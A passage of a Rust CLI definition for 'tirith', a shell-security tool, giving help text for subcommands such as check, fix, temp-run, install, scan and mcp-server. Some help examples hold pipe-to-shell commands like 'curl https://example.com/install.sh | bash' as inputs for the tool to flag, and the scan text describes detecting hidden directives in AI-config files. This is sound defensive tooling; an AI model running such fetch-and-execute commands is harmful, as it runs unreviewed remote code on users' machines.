mod assets;
mod cli;

use std::path::PathBuf;

use crate::cli::{HumanJsonFormat, HumanJsonSarifFormat};
use clap::{Parser, Subcommand};

/// A categorized command overview appended to `tirith --help` (the long help),
/// since clap-derive cannot group subcommands by category. The
/// `every_command_is_categorized` test guards this against drift.
const COMMANDS_BY_CATEGORY: &str = "\
COMMANDS BY CATEGORY:
  Scan & Analyze:   check paste run score diff fetch fix scan view preview watch temp-run taint intend lab explain why visual-audit
  Status & Health:  status doctor prompt-status dashboard warnings receipt logs baseline
  Setup & Onboard:  init onboard setup install activate update version verify-self browser devcontainer codespaces
  Policy & Trust:   policy trust rule output
  Shell & System:   daemon hooks exec env path sudo ssh context persistence hygiene aliases
  Supply-chain:     package pkg ecosystem threat-db iac canary secret command-card commands
  Integrations:     mcp mcp-server gateway agent ai lsp license
  Forensics:        audit incident checkpoint pending share redact clipboard

Run `tirith <command> --help` for details on any command.";

#[derive(Parser)]
#[command(
    name = "tirith",
    version,
    about = "URL security analysis for shell environments",
    after_long_help = COMMANDS_BY_CATEGORY
)]
pub struct Cli {
    /// Suppress low-value advisory output (clean "no issues" lines, shadow-binary
    /// warnings, tips). Never hides errors, verdicts, JSON, or security notices.
    #[arg(long, global = true)]
    quiet: bool,

    #[command(subcommand)]
    command: Commands,
}

/// Shared help text for the two `watch` spellings (`tirith watch …` and
/// `tirith checkpoint watch …`) so both surfaces document the identical
/// behavior and honesty caveats.
const WATCH_AFTER_HELP: &str = "\
What this does:
  Snapshots the current directory (plus any --paths) and your runtime state
  (env var names, $PATH, shell-rc file hashes), runs the command, then
  re-snapshots and reports: new files, modified files, $PATH additions, env
  vars added, and shell-rc modifications. A shell rc/profile file changed
  DURING the run fires a HIGH `post_run_shell_rc_modified` finding.

What this is NOT:
  - It does NOT sandbox or isolate the command. The command runs with your
    FULL privileges and can read your keychain, ssh keys, cloud creds, and the
    network. `watch` is an after-the-fact LENS, not a gate or a boundary.
  - It does NOT block. The exit code is the watched command's own exit code.
  - File snapshotting is capped to the current directory and any --paths you
    pass — it never walks all of $HOME.

--with-net-hints (EXPERIMENTAL, off by default):
  Emits best-effort network hints derived from a resolver-cache / log mtime
  delta. Best-effort hints ONLY — may miss QUIC/UDP/direct-IP; NOT a network
  monitor; not a security boundary. Absence of hints does NOT mean no network
  activity occurred.

Examples:
  tirith watch -- npm install left-pad
  tirith watch --paths ~/.config -- ./install.sh
  tirith watch --with-net-hints -- pip install requests
  tirith watch --json -- cargo build";

/// Shared help text for `tirith temp-run` (and its hidden `sandbox-dir`
/// alias). The honesty banner here is the SAME wording carried by the human
/// output banner, the JSON `disclaimer` field, and `docs/threat-model.md` —
/// pinned together by `help_snapshots.rs::help_temp_run`.
const TEMP_RUN_AFTER_HELP: &str = "\
FILE ISOLATION ONLY; NOT A SANDBOX.
  The command runs with full user privileges and can read your keychain, ssh
  keys, AWS creds, and the network. Use this for filesystem-impact preview
  ONLY. The ONLY thing temp-run changes is the working directory: the command
  starts in a fresh mkdtemp dir, so files it WRITES land there instead of your
  tree, and you get a diff of what it touched. Runtime sandboxing is an explicit
  tirith non-goal (see docs/threat-model.md) — temp-run is a file-isolation
  workflow, not a containment boundary.

What this does:
  mkdtemp → (optionally seed) → run the command there → diff the temp dir for
  new / modified files → prompt to delete or keep (default keep + print the
  path when non-interactive).

  --copy-repo   Seed the temp dir with a copy of the current repo, EXCLUDING
                .git/. Off by default (copying a large tree is slow); the
                default is an empty temp dir. Pure walkdir + fs::copy — no
                `cp --exclude` (GNU-only) dependency.
  --strip-env   Clear the child's environment and re-add only an allowlist
                (HOME, PATH, USER, LANG, TERM). A convenience knob, NOT secret
                scrubbing — a stripped env is still not a security boundary.
                Pure Command::env_clear() — no `env -i` (non-portable) shell-out.

Exit code:
  The watched command's own exit code (so `temp-run -- false` exits 1), except
  a usage error (2) or a setup/spawn failure (2). The filesystem diff is
  reported but never overrides the child's exit code.

JSON:
  Every --json envelope carries `\"isolation_kind\"`. Without `--capsule` it is
  `\"file_only_not_a_sandbox\"`, so a downstream consumer can never mistake plain
  temp-run for a security boundary. With `--capsule`, when an OS backend actually
  contains the run, it is `\"capsule_contained\"`; a degraded `--capsule` run that
  fell back to uncontained keeps the not-a-sandbox marker.

Examples:
  tirith temp-run -- ./script.sh
  tirith temp-run --copy-repo -- make build
  tirith temp-run --strip-env -- ./untrusted-installer.sh
  tirith temp-run --capsule -- ./untrusted-installer.sh
  tirith temp-run --json -- npm install left-pad";

#[derive(Subcommand)]
enum Commands {
    /// Manage the tirith background daemon
    #[command(after_help = "\
Examples:
  tirith daemon start
  tirith daemon stop
  tirith daemon status")]
    Daemon {
        #[command(subcommand)]
        action: DaemonAction,
    },

    /// Check a command for URL security issues before execution
    #[command(after_help = "\
Examples:
  tirith check -- 'curl https://example.com | bash'
  tirith check --format json -- 'npm install suspicious-pkg'")]
    Check {
        /// Shell type for tokenization
        #[arg(long, default_value = "posix")]
        shell: String,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// Force non-interactive mode
        #[arg(long)]
        non_interactive: bool,

        /// Force interactive mode
        #[arg(long)]
        interactive: bool,

        /// Write approval metadata to a temp file and print its path to stdout.
        /// Used by shell hooks for the approval workflow.
        #[arg(long)]
        approval_check: bool,

        /// Require acknowledgement for warnings (overrides policy)
        #[arg(long)]
        strict_warn: bool,

        /// Skip daemon and run analysis locally
        #[arg(long)]
        no_daemon: bool,

        /// Caller cannot enforce a block (human output is rendered as
        /// `DETECTED (shell hook cannot block in preexec mode…)` instead of
        /// `BLOCKED`). Exit codes, JSON, and audit logs are unchanged — this
        /// flag only changes the human rendering. Used by bash preexec mode
        /// where the DEBUG trap can warn but can't abort the command.
        #[arg(long)]
        warn_only: bool,

        /// Defer a non-critical block in a no-TTY context to exit 4 ("blocked,
        /// pending review") and record it in the pending registry instead of a
        /// hard block. Opt-in; CRITICAL still hard-blocks. (Or set TIRITH_DEFER=1.)
        #[arg(long)]
        defer: bool,

        /// Suppress all network activity on the hot path: skip the periodic
        /// background threat-DB refresh so analysis runs purely locally.
        /// Also honored via the TIRITH_OFFLINE environment variable.
        #[arg(long)]
        offline: bool,

        /// When the command is blocked or warned, also print a concrete safer
        /// alternative (e.g. download-then-review instead of pipe-to-shell).
        /// Advisory only — does not change the verdict or exit code.
        ///
        /// The canonical spelling is `--suggest`; `--suggest-safe-command` is
        /// kept as a visible (non-hidden) deprecated alias for backward
        /// compatibility. Both spellings resolve to the same internal flag.
        #[arg(long = "suggest", visible_alias = "suggest-safe-command")]
        suggest_safe_command: bool,

        /// Reference to a signed command card (M11 ch1) attesting to this
        /// command: a local path OR a URL. A URL is accepted but NEVER fetched on
        /// the hot path — it surfaces a "download this card first" hint (Info
        /// `command_card_unverified`) and is otherwise treated as if no card were
        /// present. A verified (local) card emits an Info `command_card_verified`
        /// finding but does NOT change the verdict (other findings still apply);
        /// a command that differs from the card emits a High
        /// `command_card_mismatch`. To verify a card hosted at a URL, download it
        /// to a local file first, then pass that path here. On Unix,
        /// `tirith command-card fetch <url>` does this download for you.
        #[arg(long)]
        card: Option<String>,

        /// The command to check
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        cmd: Vec<String>,
    },

    /// Check pasted content for security issues
    #[command(after_help = "\
Examples:
  echo \"suspicious\" | tirith paste
  tirith paste --format json < clipboard.txt")]
    Paste {
        /// Shell type for tokenization
        #[arg(long, default_value = "posix")]
        shell: String,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// Force non-interactive mode
        #[arg(long)]
        non_interactive: bool,

        /// Force interactive mode
        #[arg(long)]
        interactive: bool,

        /// Path to clipboard HTML for rich-text paste analysis
        #[arg(long)]
        html: Option<String>,

        /// Attribute the paste to its clipboard source (M12 ch1). When the
        /// companion browser extension recorded a matching source, the --json
        /// output gains a top-level `clipboard_source` key with the source URL
        /// and title. Without the extension this is a graceful no-op.
        #[arg(long)]
        with_source: bool,
    },

    /// Safely download and execute a script
    #[cfg(unix)]
    #[command(after_help = "\
Examples:
  tirith run https://get.example-tool.sh
  tirith run --no-exec https://example.com/install.sh
  tirith run --sha256 abc123 https://example.com/install.sh")]
    Run {
        /// URL to download and execute
        url: String,

        /// Download and analyze only, don't execute
        #[arg(long)]
        no_exec: bool,

        /// Execute the downloaded script inside the OS containment capsule
        /// (deny-network, scrubbed env, resource limits, FS confined to the
        /// script's cache dir). Enforcing: a host whose backend cannot enforce
        /// the containment refuses to run rather than running uncontained.
        #[arg(long)]
        capsule: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// Expected SHA-256 hash of the downloaded script (abort if mismatch)
        #[arg(long)]
        sha256: Option<String>,
    },

    /// Analyze and run a package install as a recorded transaction
    #[command(after_help = "\
A safe-install transaction: tirith analyzes an install's supply-chain risk
BEFORE running it, presents the verdict, records the transaction (a working-
directory checkpoint plus an audit entry), then runs the real install only
after the analysis and your go-ahead.

This is pre-execution install-RISK ANALYSIS plus a recorded transaction. It
does NOT sandbox or isolate the install — the real `npm install` / `pip
install` / `cargo install` (or the downloaded script) runs with your full
privileges. Runtime sandboxing is an explicit tirith non-goal.

The package(s) are scored with the deterministic `tirith package risk`
engine, the install command with the install-command rules, and any URL with
the URL analysis. A block refuses (bypass per policy); a warn requires
acknowledgement; an allow proceeds. Offline by default — `--online` adds
registry-API provenance signals; `--offline` / TIRITH_OFFLINE forces offline.

Backends (M6 ch1): npm, pip, cargo, apt, brew, dnf, yum, pacman, scoop,
docker, go, url. Today only npm / pip / cargo have a registry adapter wired
in, so `--online` provenance signals are available for those three only;
apt / brew / dnf / yum / pacman / scoop / docker / go ship command-complete
but signal-weak — analysis relies on the threat-DB name match and the
command-shape rules. A banner on every invocation says so plainly.

Privilege escalation: apt / dnf / yum typically need root (`sudo apt-get
install -y foo`). tirith does NOT auto-insert sudo — silent escalation would
be a surprise-execution footgun. Run the command itself with sudo when
required.

OS gating: scoop is Windows-only at the real-run step (the `--no-exec`
dry-run path still works on every OS, so review-on-Mac is fine).

tirith's own flags (--online, --offline, --no-exec, --yes, --format, --sha256)
go BEFORE the <source>; everything AFTER the source is passed verbatim to the
package manager (so `--save-dev` reaches npm, not tirith).

Examples:
  tirith install npm left-pad
  tirith install --online pip requests
  tirith install --yes cargo ripgrep
  tirith install --no-exec npm some-pkg       # analyze only, do not install
  tirith install npm some-pkg --save-dev      # --save-dev is passed to npm
  tirith install apt nginx                    # M6 ch1: signal-weak banner
  tirith install brew ripgrep
  tirith install docker alpine:latest
  tirith install docker alpine@sha256:abcdef0123...
  tirith install go github.com/spf13/cobra@latest
  tirith install scoop neovim                 # --no-exec on non-Windows
  tirith install url https://get.example-tool.sh")]
    Install {
        /// What to install: npm, pip, cargo, apt, brew, dnf, yum, pacman,
        /// scoop, docker, go, or url. The distro/docker/go backends ship
        /// command-complete but signal-weak (no registry-API adapter); the
        /// CLI prints a banner saying so on every invocation.
        #[arg(value_enum)]
        source: cli::install::InstallSource,

        /// Packages and flags passed verbatim to the package manager (or the
        /// URL for the `url` form). tirith's own flags go before <source>.
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        args: Vec<String>,

        /// Also consult each package's registry API (npm / PyPI / crates.io)
        /// for provenance signals. Off by default; ignored under --offline.
        #[arg(long)]
        online: bool,

        /// Force offline analysis even if --online is passed. Also honored via
        /// the TIRITH_OFFLINE environment variable.
        #[arg(long)]
        offline: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,

        /// Proceed past warnings without an interactive prompt
        #[arg(long)]
        yes: bool,

        /// Analyze and record only — do NOT run the real install
        #[arg(long)]
        no_exec: bool,

        /// Expected SHA-256 of the downloaded script (url form only)
        #[arg(long)]
        sha256: Option<String>,
    },

    /// Package firewall: resolve, inspect, and install ONLY the verified bytes,
    /// inside a containment capsule, with a tamper-evident receipt (Python only).
    #[command(after_help = "\
Examples:
  tirith pkg approve pip requests==2.31.0       # resolve+inspect, print the plan digest
  tirith pkg install pip requests==2.31.0       # install only the approved, inspected bytes
  tirith pkg install pip flask --target .venv --yes
  tirith pkg verify-env --target .venv requests flask
  tirith pkg receipt list

`tirith pkg install` is the ENFORCING path (contained, hash-pinned, fails closed
on degraded coverage); `tirith install` is the analysis path. They are distinct.")]
    Pkg {
        #[command(subcommand)]
        action: PkgAction,
    },

    /// Run adversarial training scenarios (experimental)
    #[command(after_help = "\
Examples:
  tirith lab
  tirith lab --filter powershell
  tirith lab --score
  tirith lab --non-interactive
  tirith lab --format json")]
    Lab {
        /// Filter scenarios by tag (e.g. 'powershell', 'pipe-to-shell')
        #[arg(long)]
        filter: Option<String>,

        /// Non-interactive: run all scenarios without prompting
        #[arg(long)]
        non_interactive: bool,

        /// Include a deterministic 0-100 risk score per scenario
        /// (Critical=100, High=75, Medium=50, Low=25, Info=5; max wins).
        #[arg(long)]
        score: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Score a URL for security risk
    #[command(after_help = "\
Examples:
  tirith score https://get.example-tool.sh
  tirith score --explain https://example.com
  tirith score --format json https://example.com")]
    Score {
        /// URL to score
        url: String,

        /// Show the full factor-by-factor breakdown of how the score was
        /// derived. Every factor is fixed and inspectable — the breakdown
        /// sums exactly to the final score, reproducible by hand.
        #[arg(long)]
        explain: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Compare a URL against known-good patterns
    #[command(after_help = "\
Examples:
  tirith diff https://install.example-cli.dev
  tirith diff --format json https://install.example-cli.dev")]
    Diff {
        /// URL to analyze
        url: String,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show documentation for a detection rule
    #[command(
        after_help = "\
Examples:
  tirith explain --rule pipe_to_interpreter
  tirith explain --rule curl_pipe_shell --fix
  tirith explain --finding evt-abc:0
  tirith explain --list --category terminal",
        // ArgGroup gives `--rule`/`--finding` exact-one-of semantics; `--fix`
        // requires one of them and conflicts with `--list`.
        group = clap::ArgGroup::new("explain_target")
            .args(["rule", "finding"])
            .multiple(false)
            .required(false)
    )]
    Explain {
        /// Rule ID to explain (e.g., pipe_to_interpreter)
        #[arg(long, conflicts_with = "list")]
        rule: Option<String>,

        /// List all rules, optionally filtered by category
        #[arg(long)]
        list: bool,

        /// Filter --list by category (hostname, path, transport, terminal, command, etc.)
        #[arg(long, requires = "list")]
        category: Option<String>,

        /// Resolve a finding ID (format `<event_id>:<index>`) from the audit log to its rule, then explain it.
        #[arg(long, value_name = "FINDING_ID", conflicts_with = "list")]
        finding: Option<String>,

        /// Show only the rule's remediation ("what to do instead").
        /// Requires --rule or --finding; not valid with --list.
        #[arg(long, requires = "explain_target", conflicts_with = "list")]
        fix: bool,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Explain the last triggered rule
    #[command(after_help = "\
Examples:
  tirith why
  tirith why --format json")]
    Why {
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Manage execution receipts
    #[command(after_help = "\
Examples:
  tirith receipt last
  tirith receipt list
  tirith receipt verify a1b2c3d4e5f6")]
    Receipt {
        #[command(subcommand)]
        action: ReceiptAction,
    },

    /// Manage file checkpoints for rollback (experimental)
    #[command(after_help = "\
Examples:
  tirith checkpoint create src/ Cargo.toml
  tirith checkpoint list
  tirith checkpoint restore <id>
  tirith checkpoint diff <id>
  tirith checkpoint purge")]
    Checkpoint {
        #[command(subcommand)]
        action: CheckpointAction,
    },

    /// Manage pending decisions (deferred, suppressed, restore)
    #[command(after_help = "\
Examples:
  tirith pending list
  tirith pending resolve <id> keep
  tirith pending export")]
    Pending {
        #[command(subcommand)]
        action: PendingAction,
    },

    /// Initialize tirith shell hooks
    #[command(after_help = "\
Examples:
  eval \"$(tirith init --shell zsh)\"
  eval \"$(tirith init --shell bash)\"
  tirith init --shell zsh --prompt-status   # opt-in PS1 / prompt snippet (M8 ch6)")]
    Init {
        /// Target shell (default: auto-detect)
        #[arg(long)]
        shell: Option<String>,
        /// Also append a prompt-substitution snippet so `tirith prompt-status
        /// --short` runs on every prompt redraw. Idempotent — repeated runs do
        /// not duplicate the snippet (managed by BEGIN/END markers).
        #[arg(long = "prompt-status", default_value_t = false)]
        prompt_status: bool,
    },

    /// Detect your environment and recommend a tirith setup
    #[command(
        after_help = "\
Scans the current repo for the signals that should shape your tirith setup —
shell, IDE configs (.cursor/.vscode), AI-config files (CLAUDE.md, .cursorrules,
AGENTS.md, .claude/, .cursor/rules/), package managers on PATH, lockfiles, a
.github/workflows CI pipeline, and MCP configs — then RECOMMENDS one of the
shipping policy templates (individual / ci-strict / ai-agent-heavy) and the
next steps to get protected.

Detection is read-only and never materializes hooks. --apply performs the
recommended SAFE steps (policy init, the init hook line) with per-step
confirmation on stdin; it refuses to act when run non-interactively (piped /
CI), printing what it WOULD do instead. The mode flags bias the recommendation:
--repo / --team / --ai-agent-heavy (mutually exclusive); omit them to auto-detect.

Examples:
  tirith onboard
  tirith onboard --json
  tirith onboard --ai-agent-heavy
  tirith onboard --apply",
        // ArgGroup (multiple=false) makes --repo/--team/--ai-agent-heavy
        // mutually exclusive; they collapse to one `mode` string downstream.
        group = clap::ArgGroup::new("onboard_mode")
            .args(["repo", "team", "ai_agent_heavy"])
            .multiple(false)
            .required(false)
    )]
    Onboard {
        /// Bias the recommendation toward a single-repo setup.
        #[arg(long)]
        repo: bool,
        /// Bias the recommendation toward a locked-down team / shared setup.
        #[arg(long)]
        team: bool,
        /// Bias the recommendation toward an AI-agent-heavy setup.
        #[arg(long = "ai-agent-heavy")]
        ai_agent_heavy: bool,
        /// Perform the recommended SAFE actions (with per-step stdin
        /// confirmation). Refuses to act when not an interactive terminal.
        ///
        /// Mutually exclusive with `--json`: `--apply` prints interactive prompts
        /// and may invoke `tirith init`, whose output would corrupt the JSON
        /// document. clap rejects the combination at parse time with a usage error
        /// (exit 2).
        // Internal: CodeRabbit M13 PR #132 R12-7 (kept out of `--help`).
        #[arg(long, conflicts_with = "json")]
        apply: bool,
        /// Emit the detection report + recommendation as JSON.
        #[arg(long, conflicts_with = "apply")]
        json: bool,
    },

    /// Local security dashboard: export an HTML report or serve it on loopback
    #[command(after_help = "\
Builds a LOCAL-ONLY security snapshot from your audit log (7-day window), policy,
threat DB, trust store, canaries, and shell-hook state, then either writes it as a
self-contained HTML file or serves it over a loopback-only HTTP server.

The report is built from user-controlled audit bytes, so EVERY interpolated value
is HTML-escaped — opening it can never execute pasted content. It makes NO network
calls and embeds NO external resources or tracking.

Subcommands:
  export [--out <path>]   write the HTML report.
                          default: <documents-dir>/tirith-dashboard-<date>.html
                          (<documents-dir> is your Documents folder, resolved per-OS)
                          --out .          -> ./dashboard.html
                          --out <dir>      -> <dir>/dashboard.html
                          --out <file>     -> exactly that file
  serve  [--port <p>]     serve the report on http://127.0.0.1:<port>/ (an OS
                          ephemeral port when --port is omitted), guarded by a
                          fresh in-memory token printed in the URL.

SECURITY: `serve` binds 127.0.0.1 ONLY (never 0.0.0.0). The token is random,
lives only in process memory (never written to disk/policy), and expires after
1 hour. Requests with a non-loopback Host header are refused 403 (DNS-rebinding
guard); a missing/wrong/expired token gets 401.

Examples:
  tirith dashboard export
  tirith dashboard export --out .
  tirith dashboard export --out /tmp/sec.html --json
  tirith dashboard serve
  tirith dashboard serve --port 8765")]
    Dashboard {
        #[command(subcommand)]
        action: DashboardAction,
    },

    /// Print a one-line shell-prompt status (M8 ch6).
    ///
    /// Designed to be invoked from `$PS1` / `$PROMPT` / `fish_prompt` on every
    /// redraw. Reads pre-cached protection / context / sudo / SSH state so
    /// the per-prompt overhead is ~10 ms total including binary startup
    /// (see `docs/prompt-integration.md`); the application work on a warm
    /// cache is well under 5 ms but the process spawn dominates.
    #[command(after_help = "\
Output forms:
  tirith prompt-status --short                # [tirith:guarded][aws:prod][kube:payments-prod]
  tirith prompt-status                         # tirith: guarded; aws: prod; kube: payments-prod
  tirith prompt-status --json                  # JSON envelope (stable schema_version=1)

Examples:
  tirith prompt-status --short
  tirith prompt-status --json
  PS1='$(TIRITH_STATUS=\"${TIRITH_STATUS:-}\" tirith prompt-status --short) '\"$PS1\"        # bash
  PROMPT='$(TIRITH_STATUS=\"${TIRITH_STATUS:-}\" tirith prompt-status --short) '\"$PROMPT\"  # zsh (after setopt PROMPT_SUBST)
  # The TIRITH_STATUS= prefix forwards the hook's non-exported status var to the child
  # (the ${VAR:-} form stays safe under `set -u`).

Cache:
  $XDG_RUNTIME_DIR/tirith/prompt-<uid>.cache (30s TTL).
  Falls back to state_dir() when XDG_RUNTIME_DIR is unset.
  Run `tirith context status` to force-refresh provider context.")]
    PromptStatus {
        /// Short bracketed form, intended for `$PS1` / `$PROMPT`.
        #[arg(long)]
        short: bool,
        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Show whether tirith is actively protecting this shell: protection mode,
    /// hook health, active policy + scope, and threat-DB freshness. Exits NON-ZERO
    /// when protection is provably reduced (warn-only, degraded, or no hook); exits
    /// 0 when actively blocking, or when a configured hook's live mode is not
    /// visible to an external check (run `tirith doctor` in your shell to confirm).
    Status {
        /// Output as JSON.
        #[arg(long)]
        json: bool,
    },

    /// Scan files for hidden content, config poisoning, and CI/repo supply-chain risk
    #[command(after_help = "\
Scans repository files for hidden/invisible content, AI-config poisoning, and
CI/repo supply-chain risks: unpinned GitHub Actions, the pull_request_target
trigger, curl|bash in workflow run steps, untrusted-input interpolation,
un-pinned Dockerfile base images, remote Terraform modules, untrusted Helm
chart repos, and dangerous package.json install scripts.

It also scans AI-relevant file types for content smuggled past a human
reviewer: hidden content in Jupyter notebooks (.ipynb) — invisible characters,
base64 blobs, hidden cells, suspicious outputs; hidden directives in AI
agent-instruction files (CLAUDE.md, AGENTS.md, .cursorrules) — HTML comments
and visually-hidden elements; and active or external content in SVG images —
embedded scripts, event handlers, remote references.

Examples:
  tirith scan ./
  tirith scan --ci --fail-on high ./
  tirith scan --format sarif ./ > results.sarif
  tirith scan --profile ci-hardening ./
  tirith scan --profile oss-maintainer ./

Built-in --profile values:
  ci-hardening    harden a CI/CD pipeline — every supply-chain check at full
                  strength, fail-on high
  ai-agent-repo   a repo an AI agent works in — keep injection/poisoning
                  findings, suppress low-value pinning-hygiene noise
  oss-maintainer  reviewing a contributed change — emphasize contributor-
                  controllable risk (script injection, dangerous triggers)")]
    Scan {
        /// Path to scan (directory or file)
        path: Option<String>,

        /// Scan a single file explicitly
        #[arg(long, conflicts_with = "path", conflicts_with = "stdin")]
        file: Option<String>,

        /// Read content from stdin
        #[arg(long, conflicts_with = "path", conflicts_with = "file")]
        stdin: bool,

        /// Exit non-zero in CI when findings meet threshold
        #[arg(long)]
        ci: bool,

        /// Severity threshold for CI failure
        #[arg(long, default_value = "critical")]
        fail_on: String,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonSarifFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format", conflicts_with = "sarif")]
        json: bool,
        /// Alias for --format sarif
        #[arg(long, hide = true, conflicts_with = "format", conflicts_with = "json")]
        sarif: bool,

        /// Patterns to ignore
        #[arg(long)]
        ignore: Vec<String>,

        /// Include only files matching these patterns
        #[arg(long)]
        include: Vec<String>,

        /// Exclude files matching these patterns (same as --ignore)
        #[arg(long)]
        exclude: Vec<String>,

        /// Scan profile: a built-in (ci-hardening, ai-agent-repo, oss-maintainer)
        /// or a named profile from policy (a policy profile of the same name wins)
        #[arg(long)]
        profile: Option<String>,
    },

    /// Check a URL for server-side cloaking, or download-and-keep with --save
    #[cfg(unix)]
    #[command(after_help = "\
Without --save: checks the URL for server-side cloaking (different content
served to bots vs browsers).

With --save <path>: downloads the URL to <path> (without executing it) and
marks that path TAINTED in the local taint store. A later `bash <path>` or
`source <path>` then fires the engine's tainted-file rule. This is the
download-and-keep half of `tirith run` — `run` executes from a temp file that
is normally cleaned up, so it never taints a stable path; `fetch --save` keeps
the file at a path YOU choose and taints exactly that path.

Examples:
  tirith fetch https://example.com/install.sh
  tirith fetch --format json https://example.com/install.sh
  tirith fetch --save ./install.sh https://untrusted.example/install.sh
  tirith fetch --save ./install.sh --sha256 abc123 https://untrusted.example/install.sh")]
    Fetch {
        /// URL to check for cloaking (or to download when --save is set)
        url: String,

        /// Download the URL to this path and mark it tainted (no execution)
        #[arg(long, value_name = "PATH")]
        save: Option<String>,

        /// With --save: expected SHA-256 of the download (abort on mismatch)
        #[arg(long, requires = "save")]
        sha256: Option<String>,

        /// Output format (default: human)
        #[arg(long, value_enum)]
        format: Option<HumanJsonFormat>,
        /// Alias for --format json
        #[arg(long, hide = true, conflicts_with = "format")]
        json: bool,
    },

    /// Suggest a concrete safer rewrite for a command and (interactively) apply one
    #[command(after_help = "\
Thin presenter over `tirith_core::safe_command::suggest()` — the same engine
backing `tirith check --suggest-safe-command`. Pick a numbered rewrite at the
prompt and `fix` prints exactly that command on stdout, so you can wrap with
`$(tirith fix -- '<cmd>')` and feed it straight into your shell.

When no mechanical rewrite is possible (homograph hostnames, threat-DB hits)
`fix` prints the honest per-rule remediation instead of fabricating a
command. Detection lives in the engine; `fix` adds zero heuristics of its
own. Dotfile-overwrite DOES have a mechanical rewrite (`cp <target>
<target>.bak && <original>`) when the target file exists.

Exit codes (deliberately distinct from `tirith check`):
  0  no fix needed (verdict was Allow) OR user accepted a rewrite
  1  findings exist but no mechanical rewrite is available
  2  user rejected the rewrite, JSON write failed, or stdin/stderr is not a TTY

`check` uses 0/1/2/3 (allow/block/warn/warn-ack — tied to verdict severity);
`fix`'s codes are tied to whether a rewrite was applied. The two surfaces
are deliberately different.

JSON shape (`--json` / `--non-interactive`):
  - No findings → object: {applied, reason, verdict, command}
  - Findings present → plain array of SafeSuggestion (matches the
    `safe_suggestions` array embedded in `tirith check --suggest --json`)

Examples:
  tirith fix -- 'curl https://example.com/install.sh | bash'
  tirith fix --shell bash -- 'curl -k https://example.com/install.sh | bash'
  tirith fix --non-interactive -- 'ls -la'
  tirith fix --json --non-interactive -- 'curl https://example.com/install.sh | bash'
  eval \"$(tirith fix -- 'curl -k https://example.com/install.sh')\"")]
    Fix {
        /// Shell type for tokenization (default: posix)
        #[arg(long, default_value = "posix")]
        shell: String,

        /// Non-interactive: emit JSON (the strict superset of human output)
        /// and never prompt. Implies the JSON shape regardless of `--json`.
        #[arg(long)]
        non_interactive: bool,

        /// Alias for the non-interactive JSON output mode
        #[arg(long, hide = true)]
        json: bool,

        /// The command to suggest fixes for (joined with spaces if multiple)
        #[arg(allow_hyphen_values = true, trailing_var_arg = true)]
        command: Vec<String>,
    },

    /// Run as MCP server (JSON-RPC over stdio)
    #[command(
        name = "mcp-server",
        after_help = "\
Examples:
  tirith mcp-server
  tirith mcp-server --sanitize-tool-output

Used by MCP client configurations to run tirith as a local tool server.

`--sanitize-tool-output` (M7 ch4) routes every tool result through the
output-direction analyzer before sending it back to the calling agent. Blocks
on OSC52 / hyperlink-mismatch / hidden-text / fake-prompt; the agent receives
a sanitized placeholder citing the audit event_id. Opt-in until field-tested;
default is current behavior (pass through unchanged)."
    )]
    McpServer {
        /// Route every tool result through the M7 output-direction analyzer.
        /// Blocks on dangerous escape sequences (OSC52 clipboard write, OSC0/2
        /// title rewrite, screen-clear, hyperlink mismatch, hidden text,
        /// fake-prompt). Default is pass-through.
        #[arg(long)]
        sanitize_tool_output: bool,
    },

    /// Govern the MCP servers a repository declares
    #[command(after_help = "\
Captures and governs the Model Context Protocol (MCP) servers a repository
declares across its MCP configuration files — .mcp.json / mcp.json /
mcp_settings.json and the IDE variants under .vscode/, .cursor/, .windsurf/,
.cline/, .amazonq/, .continue/, .kiro/.

`tirith mcp lock` writes a deterministic lockfile at .tirith/mcp.lock recording
every declared MCP server — its name, transport (a remote URL, or a local
command + args), and declared tools — plus a content hash per server and over
the whole inventory. The lockfile is diff-friendly: servers are sorted by name,
so a `git diff` shows exactly what changed in the repo's MCP surface.

`tirith mcp verify` gates on drift: it loads the committed lockfile, rebuilds
the current inventory, and exits non-zero when the two differ. `tirith mcp
diff` shows the same drift informationally (always exits 0).

This is a local file operation — no network, off the detection hot path.
Discovery is repo-local only: user-level configs (e.g. ~/.claude/) are never
inventoried.

Examples:
  tirith mcp lock
  tirith mcp lock --format json
  tirith mcp verify
  tirith mcp diff --format json")]
    Mcp {
        #[command(subcommand)]
        action: McpAction,
    },

    /// Inspect and govern per-agent identity (observability surface)
    #[command(after_help = "\
Surfaces the agent governance signal recorded with every tirith verdict:
`AgentOrigin` — Human / Agent / Mcp / Gateway / Ci / Ide — captured from
